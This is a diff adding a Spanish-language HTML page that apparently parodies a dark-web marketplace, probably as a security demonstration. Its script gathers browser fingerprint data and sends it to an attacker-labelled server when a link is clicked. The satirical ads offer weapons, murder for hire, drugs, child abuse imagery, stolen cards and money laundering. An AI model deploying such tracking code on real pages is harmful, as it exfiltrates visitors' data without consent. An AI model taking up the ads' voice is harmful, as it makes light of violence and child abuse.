@@ -1,0 +1,62 @@
+<html>
+<script type="text/javascript">
+
+function information() {
+    info = "Navegador CodeName: " + navigator.appCodeName + "\n";
+    info+= "Navegador Name: " + navigator.appName + "\n";
+    info+= "Navegador Version: " + navigator.appVersion + "\n";
+    info+= "Cookies Habilitadas?: " + navigator.cookieEnabled + "\n";
+    info+= "Plataforma: " + navigator.platform + "\n";
+    info+= "User-agent: " + navigator.userAgent + "\n";
+    //Envío de información a un servidor web controlado por el atacante.
+    httpGet('http://127.0.0.1:8080/gatherUserInfo?info='+info)
+}
+function httpGet(theUrl)
+{
+    var xmlHttp = null;
+    xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", theUrl, false );
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+}
+</script>
+<body>
+
+        
+        
+<h2>Venta de pistolillas... Libera todo ese stress acumulado!</h2>
+<p>
+Cansado de esa suegra pesada? Harto de tus vecinos? No hay problema que una AK no pueda solucionar! te la enviamos a la dirección que tu nos digas de forma completamente anonima. Solamente pincha en este enlace: <a onclick="javascript:information()">Get it!</a>
+</p>
+
+<h2>Hitman Service: bueno, bonito y barato</h2>
+<p>
+Harto de tus vecinos? Quieres ascender en tu trabajo, pero careces de habilidades o talento y hay muchos 'obstaculos'? No te quieres manchar las manos? Nosotros lo hacemos por ti! Trabajos personalizados. Los asesinamos, los cortamos en trocitos y los vendemos a un chino. ¿Quieres escuchar sus últimas palabras antes de palmar para conmemorar ese momento tan especial? No hay problema! ¿Quieres que te enviemos sus huevos en una bolsita? Faltara más!. Promoción limitada: Aplica a tus víctimas una tortura medieval de tu elección por un suplemento adicional de 0.1 bitcoins!  Contacta con nosotros ahora, no lo dudes más. Somos tu hitman service de confianza, satisfacción garantizada o te devolvemos tu dinero. Solamente pincha en el siguiente enlace
+</p>
+
+<h2>Con las drogas, La resaca no te parará!</h2>
+<p>
+Sexo, drogas y rock and roll? Claro! lo que tu quieras! Te vendemos toda clase de (mierda) y si quieres, te la envolvemos en papel regalo. Solamente pincha en este enlace: 
+</p>
+
+<h2>Dejad que los niños se acerquen a mi.</h2>
+<p>
+Te gustan los niños pequeños? Tenemos toda clase de imagenes y vídeos por una pequeña cantidad de bitcoins. Además, por tu compra llevate gratis crucifijos, recipientes con agua bendecida directamente desde el vaticano, sotanas, vestidos para monagillos, pildoras de viagra, elementos varios para enlantecer la gloria de dios y por supuesto, un buen par de hostias! Solamente pincha en este enlace:
+</p>
+
+<h2>Hoy no me puedo ni levantar... puff, que flojera</h2>
+<p>
+No quieres currar y te gusta la pasta fácil? Tenemos tarjetas de credito para ti! tarjetas con más de 500€ solamente por 0.1 bitcoins. Solamente pincha en este enlace:
+</p>
+
+<h2>Mangante con pasta y estilo</h2>
+<p>
+Eres un mangante que le gusta estar a la moda en todo? Eso de las cuentas en Suiza ya está muy visto, utiliza nuestro servicio de lavado de dinero utilizando la deep web. Esto es lo se lleva hoy en día, lo último para delicuentes sofisticados y finos como tu. Solamente pincha en este enlace:
+</p>
+
+<h2>Donde dije digo, digo Diego</h2>
+<p>
+Eres de esos que apoya a anonymous, la libertad de expresión, odia los monopolios, el capitalismo, la sensura, salva gatitos y protege los bosques...  y luego vas y votas al PP. Ven, ven, pincha aquí, vas a ver que contenido más interesante:
+</p>
+</body>
+</html>
